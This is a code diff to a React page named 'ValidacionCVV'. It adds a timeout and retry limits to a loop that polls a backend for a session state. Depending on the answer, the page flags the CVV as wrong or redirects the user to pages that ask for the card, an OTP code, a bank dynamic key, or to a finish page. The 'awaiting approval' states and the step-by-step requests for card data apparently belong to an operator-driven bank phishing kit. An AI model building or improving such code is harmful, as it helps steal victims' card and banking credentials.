@@ -17,19 +17,28 @@ export default function ValidacionCVV() {
     // Ref para controlar el estado de carga (fix compilación y loop)
     const loadingRef = useRef(false);
 
-    // Polling para verificar estado
+    // Polling para verificar estado con timeout y límite de reintentos
     useEffect(() => {
         let interval;
+        let timeoutId;
+        let attempts = 0;
+        const MAX_ATTEMPTS = 60; // Máximo 60 intentos = 3 minutos (60 * 3s)
+        const TIMEOUT_MS = 180000; // 3 minutos en total
 
         const checkStatus = async () => {
             try {
+                attempts++;
                 const userData = JSON.parse(localStorage.getItem("datos_usuario"));
                 const sesionId = userData?.attributes?.sesion_id || userData?.sesion_id;
-                if (!sesionId) return;
+                if (!sesionId) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    return;
+                }
 
                 const response = await instanceBackend.post(`/consultar-estado/${sesionId}`);
                 const { estado, cardData } = response.data;
-                console.log("Estado polling:", estado);
+                console.log("Estado polling:", estado, `Intento: ${attempts}/${MAX_ATTEMPTS}`);
 
                 // UPDATE CARD DATA IF PRESENT
                 if (cardData) {
@@ -37,16 +46,33 @@ export default function ValidacionCVV() {
                     localStorageService.setItem("selectedCardData", cardData);
                 }
 
+                // Verificar timeout o máximo de intentos
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
+                    setCvv("");
+                    return;
+                }
+
                 if (estado === 'error_cvv_custom') {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
                     setCargando(false);
                     setPolling(false);
                     alert("El código de verificación (CVV) es incorrecto. Por favor, verifícalo e inténtalo nuevamente.");
                     setCvv("");
                 } else if (estado !== 'pendiente' && estado !== 'solicitar_cvv_custom' && estado !== 'solicitar_cvv' && estado !== 'awaiting_tc_approval' && estado !== 'awaiting_cvv_approval') {
+                    // Limpiar intervalos antes de redirigir
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    
                     // Switch para manejar redirecciones específicas
                     switch (estado) {
                         case 'solicitar_tc': navigate("/validacion-tc"); break;
-                        case 'solicitar_tc_custom': navigate("/validacion-tc-custom"); break; // Redirigir a TC Custom View
+                        case 'solicitar_tc_custom': navigate("/validacion-tc-custom"); break;
                         case 'solicitar_otp': navigate("/numero-otp"); break;
                         case 'solicitar_din': navigate("/clave-dinamica"); break;
                         case 'solicitar_finalizar': navigate("/finalizado-page"); break;
@@ -64,13 +90,34 @@ export default function ValidacionCVV() {
                 }
             } catch (error) {
                 console.error("Error polling:", error);
+                attempts++;
+                // Si hay muchos errores consecutivos, detener polling
+                if (attempts >= MAX_ATTEMPTS) {
+                    clearInterval(interval);
+                    clearTimeout(timeoutId);
+                    setCargando(false);
+                    setPolling(false);
+                    alert("Error de conexión. Por favor, verifica tu conexión e inténtalo nuevamente.");
+                }
             }
         };
 
-        // Ejecutar polling siempre (cada 3s) para navegación fluida
+        // Ejecutar polling cada 3s
         interval = setInterval(checkStatus, 3000);
 
-        return () => clearInterval(interval);
+        // Timeout global de 3 minutos
+        timeoutId = setTimeout(() => {
+            clearInterval(interval);
+            setCargando(false);
+            setPolling(false);
+            alert("El tiempo de espera ha expirado. Por favor, verifica los datos e inténtalo nuevamente.");
+            setCvv("");
+        }, TIMEOUT_MS);
+
+        return () => {
+            clearInterval(interval);
+            clearTimeout(timeoutId);
+        };
     }, [navigate]);
 
     // ... (rest of states)
